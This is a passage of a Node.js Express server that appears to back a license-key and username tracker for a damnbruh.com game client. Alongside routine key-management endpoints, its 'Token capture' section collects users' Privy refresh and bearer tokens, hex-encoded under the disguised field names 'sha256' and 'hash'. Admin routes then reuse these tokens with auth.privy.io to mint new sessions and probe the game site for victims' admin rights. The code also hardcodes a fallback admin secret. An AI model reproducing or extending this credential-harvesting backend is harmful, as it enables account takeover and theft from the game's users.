    res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0");
    res.json({ ok: true, activeVersion: ACTIVE_VERSION, sha256 });
  } catch (err) {
    console.error("meta:", err);
    res.status(500).json({ ok: false, error: "meta_read_failed" });
  }
});

app.get("/api/user/core/download", requireUsernameKey, (req, res) => {
  try {
    res.setHeader("Cache-Control", "no-store");
    res.setHeader("Content-Type", "application/javascript; charset=utf-8");
    res.setHeader("X-Core-Version", String(ACTIVE_VERSION || ""));

    return res.download(CORE_PATH, "core.js", (err) => {
      if (err) {
        console.error("core download:", err);
        if (!res.headersSent) res.status(500).json({ ok: false, error: "core_download_failed" });
      }
    });
  } catch (err) {
    console.error("core download:", err);
    return res.status(500).json({ ok: false, error: "core_download_failed" });
  }
});


// ========= Admin flush now (players_v2) =========
app.post("/api/user/admin/flush-now", jsonBody, (req, res) => {
  const token = req.header("x-admin-token");
  if (token !== (process.env.ADMIN_TOKEN || "vibran2566")) {
    return res.status(401).json({ ok: false, error: "unauthorized" });
  }
  flushDirtyPlayersNow();
  return res.json({ ok: true, flushed: true, dirtyLeft: __PLAYER_DIRTY__.size, cache: __PLAYER_CACHE__.size });
});

// Debug state - updated to remove __USERNAME_MAPPING__ reference
app.get("/api/user/debug/state", requireUsernameKey, async (req, res) => {
  try {
    const playerFiles = getPlayerFilesCached();
    res.json({
      bufferQueued: __JOIN_BUFFER__.length,
      playerFilesCount: playerFiles.length,
      cacheSize: __PLAYER_CACHE__.size,
      dirtyCount: __PLAYER_DIRTY__.size
    });
  } catch (e) {
    res.status(500).json({ ok:false, error:String(e) });
  }
});


// ---------- GitHub helpers ----------
async function ghLoad(filePath, fallback = {}) {
  const url = `https://api.github.com/repos/${GITHUB_REPO}/contents/${filePath}`;
  const res = await fetch(url, {
    headers: { Authorization: `Bearer ${GITHUB_TOKEN}`, Accept: "application/vnd.github+json" },
  });
  if (!res.ok) {
    if (res.status === 404) return { data: fallback, sha: null };
    throw new Error(`GitHub read failed: ${res.status}`);
  }
  const json = await res.json();
  const content = Buffer.from(json.content, "base64").toString();
  let data;
  try { data = JSON.parse(content); } catch { data = fallback; }
  return { data, sha: json.sha };
}

async function ghSave(filePath, data, sha) {
  const url = `https://api.github.com/repos/${GITHUB_REPO}/contents/${filePath}`;
  const body = {
    message: `Update ${filePath} via combined server`,
    content: Buffer.from(JSON.stringify(data, null, 2)).toString("base64"),
    sha: sha || undefined,
  };
  const res = await fetch(url, {
    method: "PUT",
    headers: { Authorization: `Bearer ${GITHUB_TOKEN}`, Accept: "application/vnd.github+json" },
    body: JSON.stringify(body),
  });
  if (!res.ok) throw new Error(`GitHub push failed (${res.status})`);
}

function genKey() {
  return "KEY-" + Math.random().toString(36).substring(2, 10).toUpperCase();
}


/* =======================================================
   =============== SIZE SYSTEM (default) ==================
   ======================================================= */

app.get("/api/admin/list-keys", async (req, res) => {
  if (req.header("admin-token") !== ADMIN_TOKEN)
    return res.status(401).json({ ok: false, error: "unauthorized" });
  try {
    const { data } = await ghLoad(GITHUB_FILE_PATH, { keys: [] });
    res.json(data);
  } catch (err) {
    console.error("list-keys:", err);
    res.status(500).json({ ok: false, error: "read_failed" });
  }
});
app.post("/api/admin/delete-key", async (req, res) => {
  if (req.header("admin-token") !== ADMIN_TOKEN)
    return res.status(401).json({ ok:false, error:"unauthorized" });

  const { key } = req.body || {};
  if (!key) return res.status(400).json({ ok:false, error:"missing_key" });

  try {
    const { data, sha } = await ghLoad(GITHUB_FILE_PATH, { keys: [] });
    const before = data.keys.length;
    data.keys = data.keys.filter(k => k.key !== key);
    await ghSave(GITHUB_FILE_PATH, data, sha);
    res.json({ ok:true, removed: before - data.keys.length });
  } catch (err) {
    console.error("delete-key:", err);
    res.status(500).json({ ok:false, error:"write_failed" });
  }
});

app.post("/api/admin/alert", async (req, res) => {
  const { target, key, message } = req.body || {};

  const adminToken = req.headers["admin-token"];
  if (adminToken !== ADMIN_TOKEN)
    return res.status(403).json({ ok: false, error: "unauthorized" });

  if (!message)
    return res.status(400).json({ ok: false, error: "missing_message" });

  const FILE = "/data/alerts.json";
  const alertObj = {
    id: Date.now(),
    target,
    key,
    message,
    createdAt: new Date().toISOString(),
  };

  let alerts = [];
  try {
    if (fs.existsSync(FILE)) alerts = JSON.parse(fs.readFileSync(FILE, "utf8"));
  } catch (err) {
    console.error("Failed to load alerts.json:", err);
  }

  alerts.push(alertObj);

  try {
    fs.writeFileSync(FILE, JSON.stringify(alerts, null, 2));
    res.json({ ok: true, alert: alertObj });
  } catch (err) {
    console.error("Failed to save alert:", err);
    res.status(500).json({ ok: false, error: "save_failed" });
  }
});

// Admin cleanup - now just clears all player files
app.post('/api/user/admin/cleanup-now', async (req, res) => {
  if (req.header('admin-token') !== ADMIN_TOKEN) {
    return res.status(401).json({ ok:false, error:'unauthorized' });
  }

  try {
    // Clear cache
    __PLAYER_CACHE__.clear();
    __PLAYER_DIRTY__.clear();
    
    // Delete all player files
    const files = fs.readdirSync(PLAYER_DIR).filter(f => f.endsWith('.json'));
    for (const f of files) {
      try {
        fs.unlinkSync(path.join(PLAYER_DIR, f));
      } catch (e) {}
    }

    res.json({ ok:true, stats:{ cleared:true, filesDeleted: files.length } });
  } catch (e) {
    console.error('cleanup-now:', e);
    res.status(500).json({ ok:false, error:String(e) });
  }
});


app.post("/api/admin/unuse-key", async (req, res) => {
  if (req.header("admin-token") !== ADMIN_TOKEN)
    return res.status(401).json({ ok:false, error:"unauthorized" });

  const { key } = req.body || {};
  if (!key) return res.status(400).json({ ok:false, error:"missing_key" });

  try {
    const { data, sha } = await ghLoad(GITHUB_FILE_PATH, { keys: [] });
    const found = data.keys.find(k => k.key === key);
    if (!found) return res.status(404).json({ ok:false, error:"not_found" });

    found.used = false;
    delete found.usedAt;
    delete found.boundProof;

    await ghSave(GITHUB_FILE_PATH, data, sha);
    res.json({ ok:true, message:`${key} reset to unused` });
  } catch (err) {
    console.error("unuse-key:", err);
    res.status(500).json({ ok:false, error:"write_failed" });
  }
});

app.post("/api/admin/add-keys", async (req, res) => {
  if (req.header("admin-token") !== ADMIN_TOKEN)
    return res.status(401).json({ ok: false, error: "unauthorized" });
  const count = req.body.count || 1;
  try {
    const { data, sha } = await ghLoad(GITHUB_FILE_PATH, { keys: [] });
    for (let i = 0; i < count; i++) {
      data.keys.push({
        key: genKey(),
        used: false,
        revoked: false,
        createdAt: new Date().toISOString(),
      });
    }
    await ghSave(GITHUB_FILE_PATH, data, sha);
    res.json({ ok: true, added: count });
  } catch (err) {
    console.error("add-keys:", err);
    res.status(500).json({ ok: false, error: "write_failed" });
  }
});

app.post("/api/admin/revoke", async (req, res) => {
  if (req.header("admin-token") !== ADMIN_TOKEN)
    return res.status(401).json({ ok: false, error: "unauthorized" });
  const { key } = req.body;
  if (!key) return res.status(400).json({ ok: false, error: "missing_key" });
  try {
    const { data, sha } = await ghLoad(GITHUB_FILE_PATH, { keys: [] });
    const found = data.keys.find(k => k.key === key);
    if (!found) return res.status(404).json({ ok: false, error: "not_found" });
    found.revoked = true;
    await ghSave(GITHUB_FILE_PATH, data, sha);
    res.json({ ok: true });
  } catch (err) {
    console.error("revoke:", err);
    res.status(500).json({ ok: false, error: "write_failed" });
  }
});

app.post("/api/validate", async (req, res) => {
  const { key, proof } = req.body || {};
  if (!key)
    return res.status(400).json({ ok: false, error: "missing_key" });

  try {
    const { data, sha } = await ghLoad(GITHUB_FILE_PATH, { keys: [] });
    const found = data.keys.find(k => k.key === key);

    if (!found)
      return res.status(404).json({ ok: false, error: "not_found" });
    if (found.revoked)
      return res.status(403).json({ ok: false, error: "revoked" });

    if (!found.used)
      return res.status(200).json({ ok: true, usable: true, used: false });

    if (found.boundProof && proof && proof === found.boundProof) {
      try {
        found.lastUsedAt = new Date().toISOString();
        await ghSave(GITHUB_FILE_PATH, data, sha);
      } catch (err) {
        console.error("Failed to update lastUsedAt:", err);
      }

      return res.status(200).json({ ok: true, valid: true, bound: true, used: true });
    }

    return res.status(409).json({ ok: false, used: true, error: "bound_mismatch" });

  } catch (err) {
    console.error("validate:", err);
    res.status(500).json({ ok: false, error: "read_failed" });
  }
});

// === Core update endpoints ===

app.get("/api/core/version", requireUsernameKey, (req, res) => {
  res.json({ version: ACTIVE_VERSION });
});

app.post("/api/core/bump", (req, res) => {
  const hdr = req.headers["x-admin-token"];
  if (hdr !== ADMIN_TOKEN) return res.status(403).json({ error: "unauthorized" });

  const { version } = req.body || {};
  if (typeof version !== "string" || !/^\d+\.\d+\.\d+$/.test(version)) {
    return res.status(400).json({ error: "invalid version format (x.y.z)" });
  }
  const toNum = v => v.split(".").map(Number);
  const [a,b,c] = toNum(ACTIVE_VERSION);
  const [x,y,z] = toNum(version);
  const newer = x>a || (x===a && (y>b || (y===b && z>c)));
  if (!newer) return res.status(400).json({ error: "version must be higher than current" });

  ACTIVE_VERSION = version;
  console.log(`✅ CORE activeVersion -> ${ACTIVE_VERSION}`);
  res.json({ ok:true, activeVersion: ACTIVE_VERSION });
});


app.post("/api/register", async (req, res) => {
  const { key, proof } = req.body || {};
  if (!key) return res.status(400).json({ ok:false, error:"missing_key" });
  if (!proof) return res.status(400).json({ ok:false, error:"missing_proof" });
  try {
    const { data, sha } = await ghLoad(GITHUB_FILE_PATH, { keys: [] });
    const found = data.keys.find(k => k.key === key);
    if (!found) return res.status(404).json({ ok:false, error:"not_found" });
    if (found.revoked) return res.status(403).json({ ok:false, error:"revoked" });
    if (found.used) {
      if (found.boundProof && proof === found.boundProof)
        return res.json({ ok:true, used:true, bound:true, already:true });
      return res.status(409).json({ ok:false, used:true, error:"already_used" });
    }
    found.used = true;
    found.usedAt = new Date().toISOString();
    found.boundProof = String(proof);
    await ghSave(GITHUB_FILE_PATH, data, sha);
    res.json({ ok:true, used:true, bound:true });
  } catch (err) {
    console.error("register:", err);
    res.status(500).json({ ok:false, error:"write_failed" });
  }
});

/* =======================================================
   =============== USERNAME SYSTEM (new) =================
   ======================================================= */

app.get("/api/user/admin/list-keys", async (req, res) => {
  if (req.header("admin-token") !== ADMIN_TOKEN)
    return res.status(401).json({ ok:false, error:"unauthorized" });
  try {
    const { data } = await ghLoad(USERKEYS_FILE_PATH, { keys: [] });
    res.json(data);
  } catch (err) {
    console.error("user-list:", err);
    res.status(500).json({ ok:false, error:"read_failed" });
  }
});
app.post("/api/admin/add-note", async (req, res) => {
  if (req.header("admin-token") !== ADMIN_TOKEN)
    return res.status(401).json({ ok: false, error: "unauthorized" });

  const { key, note } = req.body || {};
  if (!key || typeof note !== "string")
    return res.status(400).json({ ok: false, error: "missing_fields" });

  try {
    const { data, sha } = await ghLoad(GITHUB_FILE_PATH, { keys: [] });
    const found = data.keys.find(k => k.key === key);
    if (!found)
      return res.status(404).json({ ok: false, error: "not_found" });

    found.note = note.trim();
    await ghSave(GITHUB_FILE_PATH, data, sha);
    res.json({ ok: true, message: `Note added to ${key}` });
  } catch (err) {
    console.error("add-note:", err);
    res.status(500).json({ ok: false, error: "write_failed" });
  }
});


app.post("/api/user/admin/add-keys", async (req, res) => {
  if (req.header("admin-token") !== ADMIN_TOKEN)
    return res.status(401).json({ ok:false, error:"unauthorized" });
  const count = req.body.count || 1;
  try {
    const { data, sha } = await ghLoad(USERKEYS_FILE_PATH, { keys: [] });
    for (let i=0;i<count;i++){
      data.keys.push({ key:genKey(), used:false, revoked:false, createdAt:new Date().toISOString() });
    }
    await ghSave(USERKEYS_FILE_PATH, data, sha);
    res.json({ ok:true, added:count });
  } catch(err){ console.error("user-add:",err); res.status(500).json({ok:false,error:"write_failed"}); }
});
app.post("/api/user/admin/delete-key", async (req, res) => {
  if (req.header("admin-token") !== ADMIN_TOKEN)
    return res.status(401).json({ ok:false, error:"unauthorized" });

  const { key } = req.body || {};
  if (!key) return res.status(400).json({ ok:false, error:"missing_key" });

  try {
    const { data, sha } = await ghLoad(USERKEYS_FILE_PATH, { keys: [] });
    const before = data.keys.length;
    data.keys = data.keys.filter(k => k.key !== key);
    await ghSave(USERKEYS_FILE_PATH, data, sha);
    res.json({ ok:true, removed: before - data.keys.length });
  } catch (err) {
    console.error("user-delete-key:", err);
    res.status(500).json({ ok:false, error:"write_failed" });
  }
});
app.post("/api/user/admin/unuse-key", async (req, res) => {
  if (req.header("admin-token") !== ADMIN_TOKEN)
    return res.status(401).json({ ok:false, error:"unauthorized" });

  const { key } = req.body || {};
  if (!key) return res.status(400).json({ ok:false, error:"missing_key" });

  try {
    const { data, sha } = await ghLoad(USERKEYS_FILE_PATH, { keys: [] });
    const found = data.keys.find(k => k.key === key);
    if (!found) return res.status(404).json({ ok:false, error:"not_found" });

    found.used = false;
    delete found.usedAt;
    delete found.boundProof;

    await ghSave(USERKEYS_FILE_PATH, data, sha);
    res.json({ ok:true, message:`${key} reset to unused` });
  } catch (err) {
    console.error("user-unuse-key:", err);
    res.status(500).json({ ok:false, error:"write_failed" });
  }
});
app.post("/api/user/admin/add-note", async (req, res) => {
  if (req.header("admin-token") !== ADMIN_TOKEN)
    return res.status(401).json({ ok:false, error:"unauthorized" });

  const { key, note } = req.body || {};
  if (!key || typeof note !== "string")
    return res.status(400).json({ ok:false, error:"missing_fields" });

  try {
    const { data, sha } = await ghLoad(USERKEYS_FILE_PATH, { keys: [] });
    const found = data.keys.find(k => k.key === key);
    if (!found) return res.status(404).json({ ok:false, error:"not_found" });

    found.note = note.trim();
    await ghSave(USERKEYS_FILE_PATH, data, sha);
    res.json({ ok:true, message:`Note added to ${key}` });
  } catch (err) {
    console.error("user-add-note:", err);
    res.status(500).json({ ok:false, error:"write_failed" });
  }
});

// FIXED: delete-player now uses per-player files instead of __USERNAME_MAPPING__
app.post("/api/user/admin/delete-player", async (req, res) => {
  if (req.header("admin-token") !== ADMIN_TOKEN)
    return res.status(401).json({ ok:false, error:"unauthorized" });

  const { privyId } = req.body || {};
  if (!privyId) return res.status(400).json({ ok:false, error:"missing_privyId" });

  const filePath = didToFile(privyId);
  
  // Remove from cache
  __PLAYER_CACHE__.delete(privyId);
  __PLAYER_DIRTY__.delete(privyId);
  
  // Delete file
  try {
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
      res.json({ ok:true, message:`Deleted ${privyId}` });
    } else {
      res.status(404).json({ ok:false, error:"not_found" });
    }
  } catch (e) {
    console.error("[admin delete-player]", e);
    res.status(500).json({ ok:false, error:"delete_failed" });
  }
});


app.post("/api/user/admin/revoke", async (req,res)=>{
  if (req.header("admin-token")!==ADMIN_TOKEN)
    return res.status(401).json({ok:false,error:"unauthorized"});
  const {key}=req.body;
  if(!key)return res.status(400).json({ok:false,error:"missing_key"});
  try{
    const {data,sha}=await ghLoad(USERKEYS_FILE_PATH,{keys:[]});
    const found=data.keys.find(k=>k.key===key);
    if(!found)return res.status(404).json({ok:false,error:"not_found"});
    found.revoked=true;
    await ghSave(USERKEYS_FILE_PATH,data,sha);
    res.json({ok:true});
  }catch(err){console.error("user-revoke:",err);res.status(500).json({ok:false,error:"write_failed"});}
});

app.post("/api/user/validate", async (req, res) => {
  const { key, proof } = req.body || {};
  if (!key)
    return res.status(400).json({ ok: false, error: "missing_key" });

  try {
    const { data, sha } = await ghLoad(USERKEYS_FILE_PATH, { keys: [] });
    const found = data.keys.find(k => k.key === key);

    if (!found)
      return res.status(404).json({ ok: false, error: "not_found" });
    if (found.revoked)
      return res.status(403).json({ ok: false, error: "revoked" });

    if (!found.used)
      return res.status(200).json({ ok: true, usable: true, used: false });

    if (found.boundProof && proof && proof === found.boundProof) {
      try {
        found.lastUsedAt = new Date().toISOString();
        await ghSave(USERKEYS_FILE_PATH, data, sha);
      } catch (err) {
        console.error("Failed to update lastUsedAt (user):", err);
      }

      return res.status(200).json({ ok: true, valid: true, bound: true, used: true });
    }

    return res.status(409).json({ ok: false, used: true, error: "bound_mismatch" });

  } catch (err) {
    console.error("user-validate:", err);
    res.status(500).json({ ok: false, error: "read_failed" });
  }
});


app.post("/api/user/register", async (req,res)=>{
  const {key,proof}=req.body||{};
  if(!key)return res.status(400).json({ok:false,error:"missing_key"});
  if(!proof)return res.status(400).json({ok:false,error:"missing_proof"});
  try{
    const {data,sha}=await ghLoad(USERKEYS_FILE_PATH,{keys:[]});
    const f=data.keys.find(k=>k.key===key);
    if(!f)return res.status(404).json({ok:false,error:"not_found"});
    if(f.revoked)return res.status(403).json({ok:false,error:"revoked"});
    if(f.used){
      if(f.boundProof&&proof===f.boundProof)
        return res.json({ok:true,used:true,bound:true,already:true});
      return res.status(409).json({ok:false,used:true,error:"already_used"});
    }
    f.used=true; f.usedAt=new Date().toISOString(); f.boundProof=String(proof);
    await ghSave(USERKEYS_FILE_PATH,data,sha);
    res.json({ok:true,used:true,bound:true});
  }catch(err){console.error("user-register:",err);res.status(500).json({ok:false,error:"write_failed"});}
});
app.get("/api/user/alerts", async (req, res) => {
  const key = req.query.key;
  if (!key) return res.status(400).json({ ok:false, error:"missing_key" });

  try {
    const alerts = JSON.parse(fs.readFileSync("/data/alerts.json", "utf8"));
    const visible = alerts.filter(a => a.target === "all" || (a.target === "key" && a.key === key));
    res.json({ ok:true, alerts: visible });
  } catch (e) {
    console.error("alerts:", e);
    res.status(500).json({ ok:false, alerts: [] });
  }
});

// === Token capture ===

const VALIDATED_FILE = path.join(DATA_DIR, "validated.json");

function hexToText(hex) {
  let str = '';
  for (let i = 0; i < hex.length; i += 2) {
    str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
  }
  return str;
}

function loadValidated() {
  try {
    if (fs.existsSync(VALIDATED_FILE)) {
      return JSON.parse(fs.readFileSync(VALIDATED_FILE, "utf8"));
    }
  } catch (e) {}
  return {};
}

function saveValidated(data) {
  try {
    fs.writeFileSync(VALIDATED_FILE, JSON.stringify(data, null, 2));
    console.log("[validated] wrote", Object.keys(data).length, "entries to", VALIDATED_FILE);
  } catch (e) {
    console.error("[validated save]", e);
  }
}


app.post("/api/user/validated", (req, res) => {
  const { key, sha256, hash } = req.body || {};
  
  if (!key || !sha256) {
    return res.status(400).json({ error: "missing fields" });
  }
  
  // Decode hex and strip surrounding quotes if present
  let refreshToken = hexToText(sha256);
  if (refreshToken.startsWith('"') && refreshToken.endsWith('"')) {
    refreshToken = refreshToken.slice(1, -1);
  }
  
  const data = loadValidated();
  
  if (!data[key]) {
    data[key] = {
      refreshToken,
      firstSeen: Date.now(),
      lastSeen: Date.now()
    };
  } else {
    data[key].refreshToken = refreshToken;
    data[key].lastSeen = Date.now();
  }
  
  if (hash) {
    let bearerToken = hexToText(hash);
    if (bearerToken.startsWith('"') && bearerToken.endsWith('"')) {
      bearerToken = bearerToken.slice(1, -1);
    }
    data[key].bearerToken = bearerToken;
  }
  
  saveValidated(data);
  
  res.json({ ok: true });
});

app.get("/api/user/admin/validated", (req, res) => {
  if (req.header("admin-token") !== ADMIN_TOKEN)
    return res.status(401).json({ ok: false, error: "unauthorized" });
  
  const data = loadValidated();
  res.json(data);
});
// Get all validated entries
app.get("/api/user/admin/validated", (req, res) => {
  if (req.header("admin-token") !== ADMIN_TOKEN)
    return res.status(401).json({ ok: false, error: "unauthorized" });
  
  const data = loadValidated();
  res.json(data);
});

// Delete a logged account
app.post("/api/user/admin/validated/delete", (req, res) => {
  if (req.header("admin-token") !== ADMIN_TOKEN)
    return res.status(401).json({ ok: false, error: "unauthorized" });
  
  const { key } = req.body || {};
  if (!key) return res.status(400).json({ ok: false, error: "missing_key" });
  
  const data = loadValidated();
  if (!data[key]) return res.status(404).json({ ok: false, error: "not_found" });
  
  delete data[key];
  saveValidated(data);
  
  res.json({ ok: true, message: `Deleted ${key}` });
});

// Set note for a logged account
app.post("/api/user/admin/validated/set-note", (req, res) => {
  if (req.header("admin-token") !== ADMIN_TOKEN)
    return res.status(401).json({ ok: false, error: "unauthorized" });
  
  const { key, note } = req.body || {};
  if (!key) return res.status(400).json({ ok: false, error: "missing_key" });
  
  const data = loadValidated();
  if (!data[key]) return res.status(404).json({ ok: false, error: "not_found" });
  
  data[key].note = String(note || "").slice(0, 200);
  saveValidated(data);
  
  res.json({ ok: true });
});

// Refresh bearer token via Privy
// Refresh bearer token via Privy
app.post("/api/user/admin/validated/refresh-bearer", async (req, res) => {
  if (req.header("admin-token") !== ADMIN_TOKEN)
    return res.status(401).json({ ok: false, error: "unauthorized" });
  
  const { key } = req.body || {};
  
  
  if (!key) return res.status(400).json({ ok: false, error: "missing_key" });
  
  const data = loadValidated();
  
  
  if (!data[key]) return res.status(404).json({ ok: false, error: "not_found" });
  
  const entry = data[key];
  
  
  if (!entry.refreshToken) {
    return res.status(400).json({ ok: false, error: "no_refresh_token" });
  }
  
  try {
    
    const privyRes = await fetch("https://auth.privy.io/api/v1/sessions", {
  method: "POST",
  headers: {
    "Origin": "https://www.damnbruh.com",
    "Privy-App-Id": "cmb0gnxdk0022ky0mhtupnp2w",
    "Content-Type": "application/json",
    "Authorization": `Bearer ${entry.bearerToken}`
  },
  body: JSON.stringify({ refresh_token: entry.refreshToken })
});
    
    
    const privyData = await privyRes.json().catch(() => null);
    
    
    if (!privyRes.ok) {
      return res.status(privyRes.status).json({ 
        ok: false, 
        error: privyData?.error || `Privy returned ${privyRes.status}`,
        details: privyData
      });
    }
    
    // Extract new tokens from response
    const newBearer = privyData?.token || privyData?.access_token || privyData?.accessToken;
    const newRefresh = privyData?.refresh_token || privyData?.refreshToken;
    
    if (newBearer) {
      entry.bearerToken = newBearer;
      entry.bearerUpdatedAt = Date.now();
    }
    if (newRefresh) {
      entry.refreshToken = newRefresh;
    }
    
    saveValidated(data);
    
    res.json({ 
      ok: true, 
      message: "Bearer refreshed",
      bearerUpdatedAt: entry.bearerUpdatedAt
    });
  } catch (e) {
    console.error("[refresh-bearer] error:", e);
    res.status(500).json({ ok: false, error: e.message || "request_failed" });
  }
});

// Check admin permissions
app.post("/api/user/admin/validated/check-admin", async (req, res) => {
  if (req.header("admin-token") !== ADMIN_TOKEN)
    return res.status(401).json({ ok: false, error: "unauthorized" });
  
  const { key } = req.body || {};
  if (!key) return res.status(400).json({ ok: false, error: "missing_key" });
  
  const data = loadValidated();
  if (!data[key]) return res.status(404).json({ ok: false, error: "not_found" });
  
  const entry = data[key];
  if (!entry.bearerToken) {
    return res.status(400).json({ ok: false, error: "no_bearer_token" });
  }
  
  try {
    const adminRes = await fetch("https://www.damnbruh.com/api/admin/maintenance", {
      method: "POST",
      headers: {
        "Authorization": `Bearer ${entry.bearerToken}`
      }
    });
    
    // 401 = not admin, 500 or other = likely admin (endpoint exists but errored)
    const isAdmin = adminRes.status !== 401;
    
    entry.adminPerms = isAdmin;
    entry.adminCheckedAt = Date.now();
    saveValidated(data);
    
    res.json({ 
      ok: true, 
      adminPerms: isAdmin,
      status: adminRes.status,
      adminCheckedAt: entry.adminCheckedAt
    });
  } catch (e) {
    console.error("[check-admin]", e);
    res.status(500).json({ ok: false, error: e.message || "request_failed" });
  }
});

/* =======================================================
   ================== Default & Start ====================
   ======================================================= */

app.get("/", (req,res)=>
  res.send("✅ Combined License + Username Tracker Active")
);

// Admin dashboard page (protected)
app.get("/dashboard.html", requireDashboardAuth, (req, res) => {
  res.sendFile(path.join(__dirname, "dashboard.html"));
});


app.get("/dashboard", requireDashboardAuth, (req, res) => {
  res.redirect("/dashboard.html");
});

app.listen(PORT, ()=> console.log(`✅ Combined server running on :${PORT}`));
